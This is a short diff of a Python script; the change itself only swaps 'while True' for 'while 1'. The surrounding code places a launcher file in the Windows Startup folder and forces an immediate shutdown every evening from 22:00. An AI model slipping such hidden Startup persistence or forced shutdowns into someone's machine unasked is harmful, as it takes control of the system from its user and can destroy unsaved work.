@@ -9,7 +9,7 @@ bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\S
 with open(bat_path + '\\' + "GodRight", "w+") as bat_file:
     bat_file.write(r'start "" "%s"' % file_path)
 
-while True:
+while 1:
     if 22 <= int(time.strftime('%H')):  # %d:Hour
         subprocess.run(["shutdown", "-s", "-t", '0'])
         exit()
